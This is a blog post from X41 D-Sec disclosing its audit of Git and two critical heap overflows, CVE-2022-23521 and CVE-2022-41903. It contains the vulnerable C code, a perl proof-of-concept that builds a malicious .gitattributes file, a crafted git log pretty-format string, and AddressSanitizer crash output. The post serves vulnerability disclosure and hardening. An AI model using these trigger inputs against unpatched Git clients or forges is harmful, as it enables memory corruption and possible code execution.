---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-17_security-audit-of-git.md
original_filename: 2023-01-17_security-audit-of-git.md
title: Security Audit of Git
category: documents
detected_topics:
- supply-chain
- xss
- command-injection
- automation-abuse
tags:
- imported
- documents
- supply-chain
- xss
- command-injection
- automation-abuse
language: en
raw_sha256: 0203d6a5115563a925f9025873f8069b16ce5cc666811eed64d43d501cf5e675
text_sha256: dfa927dd7da977143f26bb3bbb946d592c0d9aefc358732414403990b210a1e0
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Security Audit of Git

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-17_security-audit-of-git.md
- Source Type: markdown
- Detected Topics: supply-chain, xss, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `0203d6a5115563a925f9025873f8069b16ce5cc666811eed64d43d501cf5e675`
- Text SHA256: `dfa927dd7da977143f26bb3bbb946d592c0d9aefc358732414403990b210a1e0`


## Content

---
title: "Security Audit of Git"
page_title: "X41 Audited Git | X41 D-Sec - Penetration Tests and Source Code Audits"
url: "https://x41-dsec.de/security/research/news/2023/01/17/git-security-audit-ostif/"
final_url: "https://x41-dsec.de/security/research/news/2023/01/17/git-security-audit-ostif/"
authors: ["Markus Vervier (@marver)", "Eric Sesterhenn", "Joern Schneeweisz (@joernchen)", "Patrick Steinhardt"]
programs: ["Git"]
bugs: ["Memory corruption", "Out-of-bounds Write", "Out-of-bounds Read"]
publication_date: "2023-01-17"
added_date: "2023-01-28"
source: "pentester.land/writeups.json"
original_index: 1659
---

# NEWS

# Security Audit of Git

The [OSTIF](https://ostif.org) sponsored a security source code audit of Git, which was performed by a team of security experts from [X41](https://x41-dsec.de) and [GitLab](https://gitlab.com/), who sponsored the time of Joern Schneeweisz and Patrick Steinhardt to collaborate with the X41 team. Additionally, supply chain and static code analysis audits are currently being [performed](https://lore.kernel.org/git/CADKuG0uzh3syzgfiPLepiTLXNzkoYhLFX1h-DE3C7c8j6HXALQ@mail.gmail.com/).

The full report of this audit can be found here:

  * <https://www.x41-dsec.de/static/reports/X41-OSTIF-Gitlab-Git-Security-Audit-20230117-public.pdf>
  * <https://github.com/git/git/files/10430260/X41-OSTIF-Gitlab-Git-Security-Audit-20230117-public.pdf>

A blog post from the OSTIF about their efforts to secure Git and ongoing audits can be found [here](https://ostif.org/the-audit-of-git-is-complete/). The announcement for the two critical issues found in this audit is available at [OSS Security](https://www.openwall.com/lists/oss-security/2023/01/17/4).

The official Git advisories for the two critical issues are the following:

  * CVE-2022-23521: <https://github.com/git/git/security/advisories/GHSA-c738-c5qq-xg89>
  * CVE-2022-41903: <https://github.com/git/git/security/advisories/GHSA-475x-2q3q-hvwq>

## Audit Results

Our security source code audit identified two critical, one high, one medium, and four low security issues. A high number (27) of informal findings were identified as well.

Git is a distributed version control system that allows developers to collaborate on software development. It is integrated into popular packaging systems, including Golang modules, Rust cargo, and NodeJS NPM. A vulnerability in Git could potentially allow attackers to compromise source code repositories or developer systems. In a hypothetical scenario, a wormable vulnerability in Git could result in security breaches on a large scale.

The source code of Git was inspected for vulnerabilities by security experts Eric Sesterhenn (X41), Joern Schneeweisz (GitLab), and Markus Vervier (X41) using manual code review, code analysis tools, and custom fuzzing efforts. With a focus on the core components written in C, running on 64-bit Linux systems.

The most severe issue discovered allows an attacker to trigger a heap-based memory corruption during clone or pull operations, which might result in code execution. Another critical issue allows code execution during an archive operation, which is commonly performed by Git forges. Additionally, a huge number of integer related issues was identified which may lead to denial-of-service situations, out-of-bound reads or simply badly handled corner cases on large input.

These issues were assigned [CVE-2022-41903](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41903) and [CVE-2022-23521](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23521).

## Recommendations

Given the size of the Git codebase, finding each potential instance of memory safety issue would be a significant undertaking, not possible in the time given for this review. To address this, we recommend extending the use of safe wrappers and developing strategies to mitigate common memory safety issues. Introducing generic hardenings such as sanity checks on data input length and the use of safe wrappers can improve the security of the software in the short term. The usage of signed integer typed variables to store length values should be banned. Additionally, the software could benefit from compiler level checks regarding the use of integer and long variable types for length and size values. Enabling the related compiler warnings during the build process can help identify the issues early in the development process. Finally, improving the custom error handling can enable better analysis of the code with tools like Valgrind or memory leak checkers.

## CVE-2022-23521: Truncated Allocation Leading to Out of Bounds Write Via Large Number of Attributes

A critical out of bounds heap issue was identified that can be triggered via a `git clone` or `git pull` from a remote repository located on untrustworthy infrastructure.

When parsing a line from `.gitattributes`, the following code in `attr.c` can overflow the counter keeping check of the number of attributes that were parsed and are valid:
  
  
  static struct match_attr *parse_attr_line(const char *line, const char *src,
  int lineno, unsigned flags)
  {
  int namelen;
  int num_attr, i;
  const char *cp, *name, *states;
  struct match_attr *res = NULL;
  int is_macro;
  struct strbuf pattern = STRBUF_INIT;
  
  cp = line + strspn(line, blank);
  if (!*cp || *cp == '#')
  return NULL;
  name = cp;
  
  if (*cp == '"' && !unquote_c_style(&pattern, name, &states)) {
  name = pattern.buf;
  namelen = pattern.len;
  } else {
  namelen = strcspn(name, blank);
  states = name + namelen;
  }
  
  if (strlen(ATTRIBUTE_MACRO_PREFIX) < namelen &&
  starts_with(name, ATTRIBUTE_MACRO_PREFIX)) {
  if (!(flags & READ_ATTR_MACRO_OK)) {
  fprintf_ln(stderr, _("%s not allowed: %s:%d"),
  name, src, lineno);
  goto fail_return;
  }
  is_macro = 1;
  name += strlen(ATTRIBUTE_MACRO_PREFIX);
  name += strspn(name, blank);
  namelen = strcspn(name, blank);
  if (!attr_name_valid(name, namelen)) {
  report_invalid_attr(name, namelen, src, lineno);
  goto fail_return;
  }
  }
  else
  is_macro = 0;
  
  states += strspn(states, blank);
  
  /* First pass to count the attr_states */
  for (cp = states, num_attr = 0; *cp; num_attr++) {
  cp = parse_attr(src, lineno, cp, NULL);
  if (!cp)
  goto fail_return;
  }
  

Later on the value of `num_attr` is used to allocate space on the heap that attribute data is then written to as shown in the following listing:
  
  
  res = xcalloc(1,
  sizeof(*res) +
  sizeof(struct attr_state) * num_attr +
  (is_macro ? 0 : namelen + 1));
  if (is_macro) {
  res->u.attr = git_attr_internal(name, namelen);
  } else {
  char *p = (char *)&(res->state[num_attr]);
  memcpy(p, name, namelen);
  res->u.pat.pattern = p;
  

Due to variable `num_attr` being of type `int` (signed 32-bit wide), a very long attribute line or many attribute lines can overflow the variable, causing the value to become negative. A PoC to create a malicious `.gitattributes` file and commit it to a malicious repository is the following:
  
  
  perl -e 'print "A " . "\rh="x2000000000; print "\rh="x2000000000; print "\rh="x294967294 . "\n"' > .gitattributes
  git add .gitattributes
  git commit -am "evil attributes"
  # the code path taken at git-commit is different and will potentially bail out, making the commit fail - this can be solved by disabling the code in read_attr_from_file()
  

When cloning or pulling from the repository, a heap overflow occurs since the `num_attrs` value will become negative (-2) and cause the space allocated via `xcalloc()` to be only 2 bytes large. A subsequent write (`res->u.pat.pattern = p}` will then write out of bounds to the heap:
  
  
  $ git clone user@localhost:f/ff ssh-repo-crash-heap
  Cloning into 'ssh-repo-crash-heap'...
  warning: templates not found in /home/user/share/git-core/templates
  remote: Enumerating objects: 1163, done.
  remote: Counting objects: 100% (1163/1163), done.
  remote: Compressing objects: 100% (919/919), done.
  remote: Total 1163 (delta 485), reused 12 (delta 0), pack-reused 0
  Receiving objects: 100% (1163/1163), 68.87 MiB | 243.00 KiB/s, done.
  Resolving deltas: 100% (485/485), done.
  =================================================================
  ==15062==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000002550 at pc 0x5555559884d5 bp 0x7fffffffbc60 sp 0x7fffffffbc58
  WRITE of size 8 at 0x602000002550 thread T0
  #0 0x5555559884d4 in parse_attr_line /home/user/git/attr.c:393
  #1 0x5555559884d4 in handle_attr_line /home/user/git/attr.c:660
  #2 0x555555988902 in read_attr_from_index /home/user/git/attr.c:784
  #3 0x555555988902 in read_attr_from_index /home/user/git/attr.c:747
  #4 0x555555988a1d in read_attr /home/user/git/attr.c:800
  #5 0x555555989b0c in bootstrap_attr_stack /home/user/git/attr.c:882
  #6 0x555555989b0c in prepare_attr_stack /home/user/git/attr.c:917
  #7 0x555555989b0c in collect_some_attrs /home/user/git/attr.c:1112
  #8 0x55555598b141 in git_check_attr /home/user/git/attr.c:1126
  #9 0x555555a13004 in convert_attrs /home/user/git/convert.c:1311
  #10 0x555555a95e04 in checkout_entry_ca /home/user/git/entry.c:553
  #11 0x555555d58bf6 in checkout_entry /home/user/git/entry.h:42
  #12 0x555555d58bf6 in check_updates /home/user/git/unpack-trees.c:480
  #13 0x555555d5eb55 in unpack_trees /home/user/git/unpack-trees.c:2040
  #14 0x555555785ab7 in checkout builtin/clone.c:724
  #15 0x555555785ab7 in cmd_clone builtin/clone.c:1384
  #16 0x55555572443c in run_builtin /home/user/git/git.c:466
  #17 0x55555572443c in handle_builtin /home/user/git/git.c:721
  #18 0x555555727872 in run_argv /home/user/git/git.c:788
  #19 0x555555727872 in cmd_main /home/user/git/git.c:926
  #20 0x555555721fa0 in main /home/user/git/common-main.c:57
  #21 0x7ffff73f1d09 in __libc_start_main ../csu/libc-start.c:308
  #22 0x555555723f39 in _start (/home/user/git/git+0x1cff39)
  
  0x602000002552 is located 0 bytes to the right of 2-byte region [0x602000002550,0x602000002552)
  allocated by thread T0 here:
  #0 0x7ffff768c037 in __interceptor_calloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:154
  #1 0x555555d7fff7 in xcalloc /home/user/git/wrapper.c:150
  #2 0x55555598815f in parse_attr_line /home/user/git/attr.c:384
  #3 0x55555598815f in handle_attr_line /home/user/git/attr.c:660
  #4 0x555555988902 in read_attr_from_index /home/user/git/attr.c:784
  #5 0x555555988902 in read_attr_from_index /home/user/git/attr.c:747
  #6 0x555555988a1d in read_attr /home/user/git/attr.c:800
  #7 0x555555989b0c in bootstrap_attr_stack /home/user/git/attr.c:882
  #8 0x555555989b0c in prepare_attr_stack /home/user/git/attr.c:917
  #9 0x555555989b0c in collect_some_attrs /home/user/git/attr.c:1112
  #10 0x55555598b141 in git_check_attr /home/user/git/attr.c:1126
  #11 0x555555a13004 in convert_attrs /home/user/git/convert.c:1311
  #12 0x555555a95e04 in checkout_entry_ca /home/user/git/entry.c:553
  #13 0x555555d58bf6 in checkout_entry /home/user/git/entry.h:42
  #14 0x555555d58bf6 in check_updates /home/user/git/unpack-trees.c:480
  #15 0x555555d5eb55 in unpack_trees /home/user/git/unpack-trees.c:2040
  #16 0x555555785ab7 in checkout builtin/clone.c:724
  #17 0x555555785ab7 in cmd_clone builtin/clone.c:1384
  #18 0x55555572443c in run_builtin /home/user/git/git.c:466
  #19 0x55555572443c in handle_builtin /home/user/git/git.c:721
  #20 0x555555727872 in run_argv /home/user/git/git.c:788
  #21 0x555555727872 in cmd_main /home/user/git/git.c:926
  #22 0x555555721fa0 in main /home/user/git/common-main.c:57
  #23 0x7ffff73f1d09 in __libc_start_main ../csu/libc-start.c:308
  
  SUMMARY: AddressSanitizer: heap-buffer-overflow /home/user/git/attr.c:393 in parse_attr_line
  Shadow bytes around the buggy address:
  0x0c047fff8450: fa fa 00 02 fa fa 00 07 fa fa fd fd fa fa 00 00
  0x0c047fff8460: fa fa 02 fa fa fa fd fd fa fa 00 06 fa fa 05 fa
  0x0c047fff8470: fa fa fd fd fa fa 00 02 fa fa 06 fa fa fa 05 fa
  0x0c047fff8480: fa fa 07 fa fa fa fd fd fa fa 00 01 fa fa 00 02
  0x0c047fff8490: fa fa 00 03 fa fa 00 fa fa fa 00 01 fa fa 00 03
  =>0x0c047fff84a0: fa fa 00 01 fa fa 00 02 fa fa[02]fa fa fa fa fa
  0x0c047fff84b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff84c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff84d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff84e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff84f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:  00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:  fa
  Freed heap region:  fd
  Stack left redzone:  f1
  Stack mid redzone:  f2
  Stack right redzone:  f3
  Stack after return:  f5
  Stack use after scope:  f8
  Global redzone:  f9
  Global init order:  f6
  Poisoned by user:  f7
  Container overflow:  fc
  Array cookie:  ac
  Intra object redzone:  bb
  ASan internal:  fe
  Left alloca redzone:  ca
  Right alloca redzone:  cb
  Shadow gap:  cc
  ==15062==ABORTING
  

Since the size of the truncated allocation and also the data written out of bounds seem to be untrustworthy attacker controlled data from a remote repository, this is regarded as a critical issue.

## CVE-2022-41903: Out of Bounds Memory Write in Log Formatting

Consider this excerpt from `format_and_pad_commit()` in `pretty.c`, line 1750 onward:
  
  
  } else {
  int sb_len = sb->len, offset = 0;
  if (c->flush_type == flush_left)
  offset = padding - len;
  else if (c->flush_type == flush_both)
  offset = (padding - len) / 2;
  /*
  * we calculate padding in columns, now
  * convert it back to chars
  */
  padding = padding - len + local_sb.len;
  strbuf_addchars(sb, ' ', padding);
  memcpy(sb->buf + sb_len + offset, local_sb.buf,
  local_sb.len);
  }
  

The above code is reached when a padding specifier is used in the [pretty format](https://git-scm.com/docs/pretty-formats). `local_sb` is a string buffer that points to the expanded format which is to be padded. It is possible to specify a width of the padding up to $(2^{31})-1$, this is being limited in `pretty.c` line 1128 onward. Due to `sb_len` and `offset` being of type `int`, an integer overflow can let the offset calculation on `sb->buf`, `sb_len + offset` in the call to `memcpy()` overflow as well and result in a negative offset against `sb->buf`. The following pretty format illustrates this on a Git executable compiled with ASan:
  
  
  ./git log -2 --pretty='format:%>(2147483646)%x41%41%>(2147483646)%x41' > /dev/null
  =================================================================
  ==188760==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f86eb9f07fe at pc 0x7f895acc5427 bp 0x7ffc38e81100 sp 0x7ffc38e808a8
  WRITE of size 1 at 0x7f86eb9f07fe thread T0
  #0 0x7f895acc5426 in __interceptor_memcpy /usr/src/debug/gcc/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827
  #1 0x56470d2e1342 in format_and_pad_commit /home/joern/sources/git.git/pretty.c:1762
  #2 0x56470d2e1342 in format_commit_item /home/joern/sources/git.git/pretty.c:1801
  #3 0x56470d3ec217 in strbuf_expand /home/joern/sources/git.git/strbuf.c:429
  #4 0x56470d2e20db in repo_format_commit_message /home/joern/sources/git.git/pretty.c:1869
  #5 0x56470d2e442a in pretty_print_commit /home/joern/sources/git.git/pretty.c:2161
  #6 0x56470d1ffee2 in show_log /home/joern/sources/git.git/log-tree.c:781
  #7 0x56470d2034bd in log_tree_commit /home/joern/sources/git.git/log-tree.c:1117
  #8 0x56470cf0732f in cmd_log_walk_no_free builtin/log.c:508
  #9 0x56470cf0a14c in cmd_log_walk builtin/log.c:549
  #10 0x56470cf0a14c in cmd_log builtin/log.c:883
  #11 0x56470ce0e3ad in run_builtin /home/joern/sources/git.git/git.c:466
  #12 0x56470ce0e3ad in handle_builtin /home/joern/sources/git.git/git.c:721
  #13 0x56470ce118dc in run_argv /home/joern/sources/git.git/git.c:788
  #14 0x56470ce118dc in cmd_main /home/joern/sources/git.git/git.c:921
  #15 0x56470ce0bf52 in main /home/joern/sources/git.git/common-main.c:56
  #16 0x7f895aa8828f  (/usr/lib/libc.so.6+0x2328f)
  #17 0x7f895aa88349 in __libc_start_main (/usr/lib/libc.so.6+0x23349)
  #18 0x56470ce0de94 in _start ../sysdeps/x86_64/start.S:115
  
  0x7f86eb9f07fe is located 2 bytes to the left of 4831838265-byte region [0x7f86eb9f0800,0x7f880b9f0839)
  allocated by thread T0 here:
  #0 0x7f895ad247ea in __interceptor_realloc /usr/src/debug/gcc/libsanitizer/asan/asan_malloc_linux.cpp:85
  #1 0x56470d483176 in xrealloc /home/joern/sources/git.git/wrapper.c:136
  #2 0x56470d3e85f4 in strbuf_grow /home/joern/sources/git.git/strbuf.c:99
  #3 0x56470d3eb0cd in strbuf_addchars /home/joern/sources/git.git/strbuf.c:327
  #4 0x56470d2e12c9 in format_and_pad_commit /home/joern/sources/git.git/pretty.c:1761
  #5 0x56470d2e12c9 in format_commit_item /home/joern/sources/git.git/pretty.c:1801
  #6 0x56470d3ec217 in strbuf_expand /home/joern/sources/git.git/strbuf.c:429
  #7 0x56470d2e20db in repo_format_commit_message /home/joern/sources/git.git/pretty.c:1869
  #8 0x56470d2e442a in pretty_print_commit /home/joern/sources/git.git/pretty.c:2161
  #9 0x56470d1ffee2 in show_log /home/joern/sources/git.git/log-tree.c:781
  #10 0x56470d2034bd in log_tree_commit /home/joern/sources/git.git/log-tree.c:1117
  #11 0x56470cf0732f in cmd_log_walk_no_free builtin/log.c:508
  #12 0x56470cf0a14c in cmd_log_walk builtin/log.c:549
  #13 0x56470cf0a14c in cmd_log builtin/log.c:883
  #14 0x56470ce0e3ad in run_builtin /home/joern/sources/git.git/git.c:466
  #15 0x56470ce0e3ad in handle_builtin /home/joern/sources/git.git/git.c:721
  #16 0x56470ce118dc in run_argv /home/joern/sources/git.git/git.c:788
  #17 0x56470ce118dc in cmd_main /home/joern/sources/git.git/git.c:921
  #18 0x56470ce0bf52 in main /home/joern/sources/git.git/common-main.c:56
  #19 0x7f895aa8828f  (/usr/lib/libc.so.6+0x2328f)
  
  SUMMARY: AddressSanitizer: heap-buffer-overflow /usr/src/debug/gcc/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy
  Shadow bytes around the buggy address:
  0x0ff15d7360a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ff15d7360b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ff15d7360c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ff15d7360d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ff15d7360e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  =>0x0ff15d7360f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fa]
  0x0ff15d736100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ff15d736110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ff15d736120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ff15d736130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ff15d736140: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:  00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:  fa
  Freed heap region:  fd
  Stack left redzone:  f1
  Stack mid redzone:  f2
  Stack right redzone:  f3
  Stack after return:  f5
  Stack use after scope:  f8
  Global redzone:  f9
  Global init order:  f6
  Poisoned by user:  f7
  Container overflow:  fc
  Array cookie:  ac
  Intra object redzone:  bb
  ASan internal:  fe
  Left alloca redzone:  ca
  Right alloca redzone:  cb
  ==188760==ABORTING
  

The pretty format can also be used in `git archive` operations via the `export-subst` attribute, which is often used by Git forges.

The out-of-bounds write allows to write the string defined by the format specifier following the second, overflowing padding specifier to a controlled offset before `sb->buf`.

## Conclusion

In conclusion, the Git codebase shows several security issues and the sheer size of the codebase makes it challenging to address all potential instances of these issues. The use of safe wrappers can improve the overall security of the software as a short term strategy. As a long term improvement strategy, we recommend to alternate between time-boxed code base refactoring sprints and subsequent security reviews.

Author: [Eric Sesterhenn, Markus Vervier](mailto:info@x41-dsec.de)

Date: January 17, 2023 

«

[ X41 Audited The Update Framework (TUF)](/security/research/job/news/2022/10/26/tuf/)

[X41 Audited simplejson](/security/news/2023/04/26/simplejson/)

»
